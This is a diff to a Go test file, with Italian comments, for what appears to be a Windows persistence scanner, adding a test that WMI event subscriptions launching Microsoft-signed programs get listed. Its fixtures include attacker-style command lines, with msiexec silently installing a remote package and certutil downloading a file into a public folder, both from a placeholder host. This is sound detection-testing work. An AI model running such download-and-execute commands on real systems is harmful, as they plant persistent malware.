@@ -4,6 +4,8 @@ import (
 	"encoding/json"
 	"strings"
 	"testing"
+
+	"lanterna/internal/scan"
 )
 
 const wmiJSON = `{"items":[
@@ -49,5 +51,34 @@ func TestWMI(t *testing.T) {
 	b, _ := json.Marshal(items[3].entry)
 	if strings.Contains(string(b), "anna") {
 		t.Errorf("nome dell'utente: %s", b)
+	}
+}
+
+// B3 ed E2: una sottoscrizione che avvia un programma di Windows firmato da
+// Microsoft (msiexec, certutil, bitsadmin...) si elenca, perché il motore la
+// giudichi; così anche «SCM Event Log Consumer», che il motore riconosce.
+func TestWMIListed(t *testing.T) {
+	rd := testReader(newFakeEnv(`C:\Windows\System32\msiexec.exe`, `C:\Windows\System32\certutil.exe`))
+	var items []item
+	for _, c := range []psConsumer{
+		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Msi", Bound: true, Exe: `C:\Windows\System32\msiexec.exe`, Cmd: `msiexec.exe /q /i http://example.invalid/x.msi`},
+		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Cert", Bound: true, Cmd: `C:\Windows\System32\certutil.exe -urlcache -f http://example.invalid/x C:\Users\Public\x.exe`},
+		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Msi2", Bound: true, Exe: `C:\Windows\System32\msiexec.exe`, Cmd: `msiexec.exe /x {11111111-2222-3333-4444-555555555555}`},
+		{NS: "root/subscription", Class: "ActiveScriptEventConsumer", Name: "Script", Bound: true, Engine: "VBScript", SFile: `C:\Windows\System32\x.vbs`},
+		{NS: "root/subscription", Class: "NTEventLogEventConsumer", Name: "SCM Event Log Consumer", Bound: true},
+	} {
+		it := rd.consumerItem(c)
+		// Come li verificherebbe Windows: file di Microsoft nella sua cartella.
+		if it.file != "" {
+			it.entry.File = msFile("windows")
+		}
+		items = append(items, it)
+	}
+	if items[0].file != `C:\Windows\System32\msiexec.exe` || !items[0].interpreted {
+		t.Errorf("msiexec con un pacchetto in rete: %+v", items[0])
+	}
+	entries, counts := assemble(items)
+	if len(entries) != 5 || counts["wmi"] != (scan.AutorunCount{Total: 5}) {
+		t.Errorf("sottoscrizioni elencate %d, conteggi %+v", len(entries), counts)
 	}
 }
